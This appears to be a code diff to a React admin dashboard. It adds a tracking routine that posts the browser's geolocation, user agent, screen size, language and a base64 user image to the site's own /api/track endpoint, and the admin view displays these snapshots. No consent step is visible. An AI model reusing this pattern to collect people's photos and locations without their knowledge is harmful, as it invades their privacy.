@@ -13,9 +13,10 @@ const AdminDashboard = () => {
     latitude: number;
     longitude: number;
     userAgent: string;
-    screen?: { width: number; height: number };
+    screen: string | { width: number; height: number }; // allow object or string
     language: string;
     imagePath?: string;
+    lastUpdated?: string;
   };
 
   type Contact = {
@@ -31,7 +32,7 @@ const AdminDashboard = () => {
   const [contacts, setContacts] = useState<Contact[]>([]);
   const [error, setError] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
-const API_URL = import.meta.env.VITE_API_URL;
+  const API_URL = import.meta.env.VITE_API_URL;
 
   const authHeaders = {
     headers: {
@@ -46,8 +47,9 @@ const API_URL = import.meta.env.VITE_API_URL;
       return;
     }
     setLoading(true);
-    
-axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
+
+    axios
+      .get(`${API_URL}/api/admin/contacts`, authHeaders)
       .then(() => {
         setIsAuthenticated(true);
         fetchData(view);
@@ -62,10 +64,27 @@ axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
     setError(null);
     setLoading(true);
     if (currentView === "tracking") {
-      axios.get(`${API_URL}/api/admin/tracking`, authHeaders)
+      axios
+        .get(`${API_URL}/api/admin/tracking`, authHeaders)
         .then((res) => {
-          if (res.data.success) setTrackingLogs(res.data.tracking);
-          else setError("Failed to fetch tracking logs.");
+          if (res.data.success) {
+            // Normalize screen field here: convert object to string if needed
+            const normalizedLogs = res.data.tracking.map((log: TrackingLog) => {
+              if (
+                log.screen &&
+                typeof log.screen !== "string" &&
+                "width" in log.screen &&
+                "height" in log.screen
+              ) {
+                return {
+                  ...log,
+                  screen: `${log.screen.width}x${log.screen.height}`,
+                };
+              }
+              return log;
+            });
+            setTrackingLogs(normalizedLogs);
+          } else setError("Failed to fetch tracking logs.");
           setLoading(false);
         })
         .catch(() => {
@@ -73,8 +92,8 @@ axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
           setLoading(false);
         });
     } else {
-            axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
-
+      axios
+        .get(`${API_URL}/api/admin/contacts`, authHeaders)
         .then((res) => {
           if (res.data.success) setContacts(res.data.contacts);
           else setError("Failed to fetch contacts.");
@@ -156,6 +175,7 @@ axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
             padding: "12px",
             marginBottom: 20,
             fontSize: 16,
+            color:"black",
             borderRadius: 6,
             border: "1px solid #ccc",
             boxSizing: "border-box",
@@ -229,27 +249,50 @@ axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
             width: window.screen.width,
             height: window.screen.height,
           };
-          //            axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
 
-
-          fetch(`${API_URL}/api/admin/contacts`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude: 0,
-              longitude: 0,
-              userAgent: navigator.userAgent,
-              screen,
-              language: navigator.language,
-              image: base64Image,
-            }),
-          })
-            .then((res) => res.json())
-            .then((data) => {
-              console.log("Tracking saved:", data);
-              fetchData("tracking");
+          const sendTracking = (latitude: number, longitude: number) => {
+            fetch(`${API_URL}/api/track`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                latitude,
+                longitude,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                image: base64Image,
+              }),
             })
-            .catch((err) => console.error("Tracking error:", err));
+              .then((res) => {
+                if (!res.ok) throw new Error("Tracking failed");
+                return res.json();
+              })
+              .then((data) => {
+                console.log("Tracking saved:", data);
+                if (data.action) {
+                  // "created" or "updated"
+                  console.log(`Record was ${data.action}`);
+                }
+              })
+              .catch((err) => {
+                console.error("Tracking error:", err);
+              });
+          };
+
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                sendTracking(position.coords.latitude, position.coords.longitude);
+              },
+              (error) => {
+                console.error("Geolocation error:", error);
+                // Fallback to default (0,0)
+                sendTracking(0, 0);
+              }
+            );
+          } else {
+            sendTracking(0, 0);
+          }
         }}
       />
 
@@ -365,31 +408,33 @@ axios.get(`${API_URL}/api/admin/contacts`, authHeaders)
                         : log.userAgent}
                     </td>
                     <td style={tableCellStyle}>
-                      {log.screen?.width} x {log.screen?.height}
+                      {/* Fix screen rendering */}
+                      {typeof log.screen === "string"
+                        ? log.screen
+                        : log.screen && "width" in log.screen && "height" in log.screen
+                        ? `${log.screen.width}x${log.screen.height}`
+                        : "N/A"}
                     </td>
                     <td style={tableCellStyle}>{log.language}</td>
                     <td style={tableCellStyle}>
-                         {log.imagePath ? (
-                            // `${API_URL}/api/admin/contacts`
-    <img
-      src={`${API_URL}${log.imagePath}?t=${new Date(log.timestamp).getTime()}`}
-      alt="User snapshot"
-      width={120}
-      height={90}
-      style={{ objectFit: "cover", borderRadius: 6 }}
-      crossOrigin="anonymous" // Add this attribute
-      onError={(e) => {
-        const target = e.currentTarget;
-        console.error('Image load error:', target.src);
-        target.src = "https://placehold.co/120x90?text=No+Image";
-      }}
-      onLoad={() => console.log('Image loaded successfully')}
-    />
-  ) : (
-    "No image"
-  )}
-</td>
-
+                      {log.imagePath ? (
+                        <img
+                          src={`${API_URL.replace(/\/$/, "")}${log.imagePath}`}
+                          alt="User snapshot"
+                          width={120}
+                          height={90}
+                          style={{ objectFit: "cover", borderRadius: 6 }}
+                          crossOrigin="anonymous"
+                          onError={(e) => {
+                            const target = e.currentTarget;
+                            console.error("Image load error:", target.src);
+                            target.src = "https://placehold.co/120x90?text=No+Image";
+                          }}
+                        />
+                      ) : (
+                        "No image"
+                      )}
+                    </td>
                   </tr>
                 ))}
               </tbody>
